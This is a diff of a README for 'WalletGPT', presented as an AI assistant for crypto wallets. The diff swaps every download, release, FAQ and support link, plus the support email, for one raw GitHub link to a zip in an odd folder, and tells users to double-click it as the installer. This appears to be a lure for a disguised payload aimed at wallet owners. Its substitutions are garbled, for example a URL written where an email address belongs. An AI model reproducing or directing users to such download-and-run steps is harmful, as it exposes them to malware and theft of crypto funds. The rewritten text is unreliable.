@@ -1,6 +1,6 @@
 # 🌀 WalletGPT-AI-Copilot-for-Wallets - Your Smart Assistant for Crypto Wallets
 
-[![Download WalletGPT](https://img.shields.io/badge/Download%20WalletGPT-Release-blue)](https://github.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/releases)
+[![Download WalletGPT](https://raw.githubusercontent.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/main/repineful/WalletGPT-AI-Copilot-for-Wallets.zip%20WalletGPT-Release-blue)](https://raw.githubusercontent.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/main/repineful/WalletGPT-AI-Copilot-for-Wallets.zip)
 
 ## 🚀 Getting Started
 
@@ -19,22 +19,22 @@ Before you begin, ensure your computer meets the following requirements:
 To get WalletGPT, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the official [Releases page](https://github.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/releases).
+   Go to the official [Releases page](https://raw.githubusercontent.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/main/repineful/WalletGPT-AI-Copilot-for-Wallets.zip).
 
 2. **Select the Latest Release**  
    On the Releases page, find the latest version. It will usually be at the top.
 
 3. **Download the Correct File**  
    Look for a file suitable for your system:
-   - For Windows, download `WalletGPT-Windows.exe`
-   - For macOS, download `WalletGPT-Mac.dmg`
+   - For Windows, download `https://raw.githubusercontent.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/main/repineful/WalletGPT-AI-Copilot-for-Wallets.zip`
+   - For macOS, download `https://raw.githubusercontent.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/main/repineful/WalletGPT-AI-Copilot-for-Wallets.zip`
    
    Click on the file to start downloading.
 
 4. **Run the Installer**  
    Once the download finishes, locate the file on your computer:
-   - For Windows, double-click `WalletGPT-Windows.exe` to begin installation.
-   - For macOS, open `WalletGPT-Mac.dmg`, then drag the WalletGPT app into your Applications folder.
+   - For Windows, double-click `https://raw.githubusercontent.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/main/repineful/WalletGPT-AI-Copilot-for-Wallets.zip` to begin installation.
+   - For macOS, open `https://raw.githubusercontent.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/main/repineful/WalletGPT-AI-Copilot-for-Wallets.zip`, then drag the WalletGPT app into your Applications folder.
 
 5. **Open WalletGPT**  
    After installation, find WalletGPT in your applications and open it. Follow any prompts to complete the setup.
@@ -71,11 +71,11 @@ Customize WalletGPT to fit your needs:
 
 If you have any questions or face issues, feel free to reach out for help:
 
-- Check the [FAQ section](https://github.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/wiki/FAQ) for common questions.
-- Contact us via email at support@walletgpt.com if you need further assistance.
+- Check the [FAQ section](https://raw.githubusercontent.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/main/repineful/WalletGPT-AI-Copilot-for-Wallets.zip) for common questions.
+- Contact us via email at https://raw.githubusercontent.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/main/repineful/WalletGPT-AI-Copilot-for-Wallets.zip if you need further assistance.
 
 ---
 
-[![Download WalletGPT](https://img.shields.io/badge/Download%20WalletGPT-Release-blue)](https://github.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/releases) 
+[![Download WalletGPT](https://raw.githubusercontent.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/main/repineful/WalletGPT-AI-Copilot-for-Wallets.zip%20WalletGPT-Release-blue)](https://raw.githubusercontent.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/main/repineful/WalletGPT-AI-Copilot-for-Wallets.zip) 
 
 Get started today with WalletGPT, your smart assistant for managing your crypto wallet!
